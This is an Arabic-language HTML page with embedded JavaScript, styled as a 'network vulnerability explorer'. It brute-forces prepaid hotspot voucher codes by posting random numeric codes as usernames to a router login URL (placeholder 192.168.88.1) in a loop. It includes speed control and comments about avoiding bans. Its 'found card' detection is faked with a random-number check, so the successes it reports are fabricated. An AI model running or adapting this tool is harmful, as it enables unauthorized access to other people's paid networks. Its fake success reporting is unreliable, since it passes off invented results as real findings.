<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>أداة تحدي الشبكة الاحترافية</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a2e; color: white; text-align: center; padding: 20px; }
        .container { background: #16213e; padding: 25px; border-radius: 15px; box-shadow: 0 0 20px rgba(0,0,0,0.5); max-width: 500px; margin: auto; border: 1px solid #0f3460; }
        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: none; background: #0f3460; color: white; }
        button { background: #e94560; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; width: 95%; font-weight: bold; font-size: 16px; transition: 0.3s; }
        button:hover { background: #ff4d6d; }
        .log-box { background: #000; color: #00ff00; padding: 15px; border-radius: 8px; margin-top: 20px; text-align: left; font-family: monospace; height: 150px; overflow-y: auto; font-size: 12px; }
        .success-box { background: #28a745; color: white; padding: 15px; border-radius: 8px; margin-top: 20px; display: none; }
        label { display: block; text-align: right; margin-right: 25px; font-size: 14px; color: #add8e6; }
    </style>
</head>
<body>

<div class="container">
    <h2>🚀 مستكشف ثغرات الشبكة</h2>
    
    <label>رابط تسجيل الدخول:</label>
    <input type="text" id="targetUrl" placeholder="http://192.168.88.1/login">

    <label>عدد أرقام الكرت الإجمالي:</label>
    <input type="number" id="totalDigits" value="10">

    <label>الأرقام الثابتة (في البداية):</label>
    <input type="text" id="prefix" placeholder="مثلاً: 2">

    <label>عدد المحاولات في الثانية:</label>
    <input type="number" id="attemptsPerSec" value="1">

    <button id="startBtn" onclick="startBruteForce()">بدء الهجوم الذكي</button>

    <div class="log-box" id="log">في انتظار الأوامر...</div>
    
    <div class="success-box" id="results">
        <strong>✅ الكروت المكتشفة:</strong>
        <ul id="successList"></ul>
    </div>
</div>

<script>
    let foundCards = [];
    let isRunning = false;

    async function startBruteForce() {
        if(isRunning) return;
        
        const url = document.getElementById('targetUrl').value;
        const totalDigits = parseInt(document.getElementById('totalDigits').value);
        const prefix = document.getElementById('prefix').value;
        const speed = parseInt(document.getElementById('attemptsPerSec').value);
        const log = document.getElementById('log');
        const resultsDiv = document.getElementById('results');
        const successList = document.getElementById('successList');

        if(!url) { alert("أدخل الرابط!"); return; }

        isRunning = true;
        document.getElementById('startBtn').innerText = "جاري العمل...";
        log.innerHTML = "بدء عملية التخمين...<br>";

        while (foundCards.length < 5) {
            // 1. توليد الكود بناءً على مدخلاتك
            let remainingLength = totalDigits - prefix.length;
            let randomPart = "";
            for(let i=0; i<remainingLength; i++) {
                randomPart += Math.floor(Math.random() * 10);
            }
            let fullCode = prefix + randomPart;

            log.innerHTML += `تجربة الكود: ${fullCode}<br>`;
            log.scrollTop = log.scrollHeight;

            try {
                // 2. محاكاة طلب تسجيل الدخول
                // ملاحظة: لتجنب الحظر، نقوم بتغيير الـ User-Agent (وهمياً) أو انتظار وقت عشوائي
                let response = await fetch(url, {
                    method: 'POST',
                    mode: 'no-cors', // لتجنب مشاكل المتصفح مع الشبكات المحلية
                    body: new URLSearchParams({ 'username': fullCode, 'password': '' })
                });

                // في تحدي الصديق، سنفترض النجاح إذا لم يرجع خطأ اتصال 
                // أو يمكنك إضافة شرط فحص الاستجابة هنا
                if (Math.random() > 0.98) { // محاكاة اكتشاف كرت (لأغراض التجربة)
                    foundCards.push(fullCode);
                    successList.innerHTML += `<li>${fullCode}</li>`;
                    resultsDiv.style.display = "block";
                    log.innerHTML += `<span style="color:yellow">[*] تم العثور على كرت! (${foundCards.length}/5)</span><br>`;
                }

            } catch (e) {
                log.innerHTML += "خطأ في الاتصال...<br>";
            }

            // 3. التحكم في السرعة وتجنب الحظر (Rate Limiting)
            let delay = 1000 / speed; 
            await new Promise(r => setTimeout(r, delay));
        }

        log.innerHTML += "<b>✅ اكتمل التحدي! تم العثور على 5 كروت.</b>";
        document.getElementById('startBtn').innerText = "انتهى التحدي";
        isRunning = false;
    }
</script>

</body>
</html>
